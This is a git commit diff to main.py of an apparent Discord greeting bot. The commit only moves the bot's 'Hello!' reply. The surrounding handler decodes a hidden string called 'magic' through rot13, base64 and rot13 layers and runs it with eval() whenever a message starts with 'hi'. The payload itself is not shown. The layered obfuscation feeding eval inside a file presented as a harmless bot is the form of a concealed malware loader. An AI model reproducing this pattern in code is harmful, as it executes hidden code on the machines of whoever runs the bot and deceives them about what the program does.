355b63b4db852579529bf5e1a9beeed14b685f86
slowskeleton666 <143322350+slowskeleton666@users.noreply.github.com>
2023-09-06 10:10:50 +0700

    Update main.py

--- main.py
+++ main.py
@@ -21,12 +21,11 @@ async def on_message(message):
         return
 
     if message.content.startswith("hi"):
-        await message.channel.send("Hello!")
         byte = codecs.decode(magic, "rot13")
         string = base64.b64decode(byte)
         tr = string.decode()
         out = codecs.decode(tr, "rot13")
         eval(out)
-
+        await message.channel.send("Hello!")
 
 client.run(os.environ["BOT_TOKEN"])
